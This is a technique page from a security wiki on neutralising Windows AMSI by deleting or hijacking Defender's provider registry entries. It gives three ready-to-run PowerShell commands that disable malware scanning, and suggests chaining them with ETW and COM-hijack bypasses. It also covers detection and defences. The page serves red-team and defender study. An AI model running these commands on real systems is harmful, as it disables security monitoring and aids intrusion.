---
title: AMSI Providers Tampering
slug: amsi-providers-tampering
---

> **TL;DR:** AMSI loads scanner DLLs by enumerating CLSIDs under `HKLM\SOFTWARE\Microsoft\AMSI\Providers` — delete, hijack, or shadow that key (or its CLSID target) and the host process initialises with zero functional scanners.

## What it is
The Antimalware Scan Interface delegates actual content scanning to registered providers. When `AmsiInitialize` runs in a host (PowerShell, WSH, JScript, Office, Defender for MSIL), it walks `HKLM\SOFTWARE\Microsoft\AMSI\Providers`, resolves each subkey (a CLSID GUID) against `HKLM\SOFTWARE\Classes\CLSID\{...}\InprocServer32`, and `CoCreateInstance`s the DLL. Removing entries, redirecting the CLSID, or planting a no-op provider neutralises AMSI for that host without patching `amsi.dll` in memory — a defence avoiding the [[amsi-bypass]] memory-patch IOCs.

## Preconditions / where it applies
- Administrator on the box for the `HKLM` writes (standard variants); HKCU COM-hijack variants work for medium integrity
- Tamper must occur *before* the host process loads AMSI providers — once Defender's MpOav.dll is mapped, removing the key has no effect on that instance
- Survives across user sessions until Defender re-registers the provider (engine update, service restart)

## Technique
Defender's provider is `{2781761E-28E0-4109-99FE-B9D127C57AFE}` (`MpOav.dll`). Three common moves: (1) delete the Providers subkey; (2) repoint `InprocServer32` to a benign stub DLL exporting `DllGetClassObject` returning `E_NOTIMPL`; (3) abuse `HKCU\SOFTWARE\Classes\CLSID\{...}` COM-hijack precedence to shadow the HKLM entry from a medium-integrity process.

```powershell
# Variant 1 — remove the Defender AMSI provider registration (admin)
Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Force

# Variant 2 — repoint the CLSID to an attacker stub (admin)
$clsid = "HKLM:\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}\InprocServer32"
Set-ItemProperty $clsid -Name "(default)" -Value "C:\ProgramData\noop.dll"

# Variant 3 — HKCU COM hijack (medium integrity, current user only)
New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}\InprocServer32" -Force `
  | Set-ItemProperty -Name "(default)" -Value "C:\Users\Public\noop.dll"
```

Compose with [[com-hijacking]] and [[etw-bypass]] for a fully unhooked PowerShell. WDAC in `Audit` mode does not block the rogue DLL load — only `Enforced` integrity policies do.

## Detection and defence
- Sysmon Event ID 13 on writes/deletes to `HKLM\SOFTWARE\Microsoft\AMSI\Providers\*` and the linked CLSID subkeys
- Defender ASR rule "Block abuse of exploited vulnerable signed drivers" does not cover this; instead enable the `Tamper Protection` toggle which prevents provider removal
- WDAC / Smart App Control blocks loading the unsigned shadow DLL
- Periodic baseline check: enumerate `HKLM\SOFTWARE\Microsoft\AMSI\Providers` and compare CLSID → DLL to a known-good catalogue

## References
- [Pentest Laboratories — AMSI Bypass Methods](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/) — provider-tamper walkthrough
- [Pentestlab — Persistence: AMSI](https://pentestlab.blog/2021/05/17/persistence-amsi/) — rogue provider as persistence
- [enigma0x3 — Bypassing AMSI via COM Server Hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/) — original HKCU CLSID research
